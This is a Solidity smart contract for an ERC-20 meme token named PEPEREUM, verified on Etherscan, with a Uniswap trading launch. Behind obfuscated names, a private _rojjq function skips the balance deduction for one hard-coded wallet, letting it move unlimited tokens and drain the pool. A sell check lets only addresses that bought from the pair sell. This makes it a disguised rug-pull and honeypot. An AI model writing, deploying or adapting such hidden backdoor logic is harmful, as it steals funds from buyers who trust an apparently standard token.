/**
 *Submitted for verification at Etherscan.io on 2023-10-10
*/

/*

TWITTER: https://twitter.com/PEPEREUM_Coin

TELEGRAM: https://t.me/PEPEREUM_Erc20

WEBSITE: http://pepexerc.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rojjq(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rojjq(a, b, "SafeMath");
    }

    function  _rojjq(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PEPEREUM is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _dvsqaj;
    address payable private _tkjyop;
    address private _rkpijo;

    string private constant _name = unicode"PEPEREUM";
    string private constant _symbol = unicode"PEPEREUM";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _evhjqr;
    mapping (address => bool) private _yrvirny;
    mapping(address => uint256) private _fnfojp;
    uint256 public _qzlqub = _totalSupply;
    uint256 public _drpbje = _totalSupply;
    uint256 public _koclev= _totalSupply;
    uint256 public _vdqdif= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yodebj=0;
    uint256 private _eynzjy=0;
    

    bool private _bruplh;
    bool public _uerivoqf = false;
    bool private bkipoe = false;
    bool private _ofrhpv = false;


    event _pvuhia(uint _qzlqub);
    modifier unrhoxr {
        bkipoe = true;
        _;
        bkipoe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _evhjqr[owner(

        )] = true;
        _evhjqr[address
        (this)] = true;
        _evhjqr[
            _tkjyop] = true;
        _tkjyop = 
        payable (0x040ca4d8F3d2D014dca013C204b5b311C773d8fA);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rojjq(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvuarb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uerivoqf) {
                if (to 
                != address
                (_dvsqaj) 
                && to !=
                 address
                 (_rkpijo)) {
                  require(_fnfojp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnfojp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkpijo && to != 
            address(_dvsqaj) &&
             !_evhjqr[to] ) {
                require(amount 
                <= _qzlqub,
                 "Exceeds the _qzlqub.");
                require(balanceOf
                (to) + amount
                 <= _drpbje,
                  "Exceeds the _drpbje.");
                if(_eynzjy
                < _yodebj){
                  require
                  (! _rofplgr(to));
                }
                _eynzjy++;
                 _yrvirny
                 [to]=true;
                kvuarb = amount._pvr
                ((_eynzjy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkpijo &&
             from!= address(this) 
            && !_evhjqr[from] ){
                require(amount <= 
                _qzlqub && 
                balanceOf(_tkjyop)
                <_vdqdif,
                 "Exceeds the _qzlqub.");
                kvuarb = amount._pvr((_eynzjy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_eynzjy>
                _yodebj &&
                 _yrvirny[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!bkipoe 
            && to == _rkpijo &&
             _ofrhpv &&
             contractTokenBalance>
             _koclev 
            && _eynzjy>
            _yodebj&&
             !_evhjqr[to]&&
              !_evhjqr[from]
            ) {
                _transferFrom( _wviqf(amount, 
                _wviqf(contractTokenBalance,
                _vdqdif)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _plkzoly(address
                    (this).balance);
                }
            }
        }

        if(kvuarb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvuarb);
          emit
           Transfer(from,
           address
           (this),kvuarb);
        }
        _balances[from
        ]= _rojjq(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rojjq(kvuarb));
        emit Transfer
        (from, to, 
        amount.
         _rojjq(kvuarb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      unrhoxr {
        if(tokenAmount==
        0){return;}
        if(!_bruplh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _dvsqaj.WETH();
        _approve(address(this),
         address(
             _dvsqaj), 
             tokenAmount);
        _dvsqaj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wviqf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rojjq(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tkjyop){
            return a ;
        }else{
            return a .
             _rojjq (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qzlqub = _totalSupply;
        _drpbje = _totalSupply;
        emit _pvuhia(_totalSupply);
    }

    function _rofplgr(address 
    account) private view 
    returns (bool) {
        uint256 eukfdr;
        assembly {
            eukfdr :=
             extcodesize
             (account)
        }
        return eukfdr > 
        0;
    }

    function _plkzoly(uint256
    amount) private {
        _tkjyop.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bruplh ) ;
        _dvsqaj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _dvsqaj), 
            _totalSupply);
        _rkpijo = 
        IUniswapV2Factory(_dvsqaj.
        factory( ) 
        ). createPair (
            address(this
            ),  _dvsqaj .
             WETH ( ) );
        _dvsqaj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkpijo).
        approve(address(_dvsqaj), 
        type(uint)
        .max);
        _ofrhpv = true;
        _bruplh = true;
    }

    receive() external payable {}
}